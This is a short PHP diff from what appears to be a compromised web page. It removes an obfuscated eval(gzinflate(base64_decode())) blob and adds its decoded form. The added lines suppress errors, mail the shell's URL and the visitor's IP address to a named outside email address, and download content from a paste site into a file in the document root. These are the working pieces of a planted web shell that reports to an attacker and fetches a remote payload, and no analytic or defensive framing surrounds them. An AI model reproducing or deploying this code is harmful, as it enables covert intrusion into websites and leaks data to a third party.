@@ -22,7 +22,14 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 
 
 <?php
-eval(gzinflate(base64_decode("jZBPSwMxEMXvgt9hCIVUKF2ht0rBYnPooV1Nt16khO123ESzmyUZsfjnu5tsEdGTp8DMy++9eQFJkWlQWdMYGl5eXJ2foffOK4+d82Ta+jQc7F0IMANeuQO+Bayu66Y0dly5hqf1UXUl6ShgmqibZhmDMQzURsh7IR/46VXr+Urw3a+NFHdbsSnUVi75LpFMlygbjdbCFN7hG/0JH7C8hfnh4DFGSSv2h7TKC6Hmi4XsPRh8sghMMYd9/BEwieHFEvR0NoJoFof/AfUdVBqr58nsR7nIb7YrsS6UzPPipM1iN2NNjWWQvhAeaRIPejQWVR3brlxL2FIY8lRUiE3V2gXamzZ2mXVlIMyCfvIu8+UrT7Zf")));
+set_time_limit(0);
+error_reporting(0);
+$boss = 'mrtundelawal@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$ip = "Shell : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
+mail($boss, "Result Shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
+$check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
+$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
 
 #function
 function ambilKata($param, $kata1, $kata2){
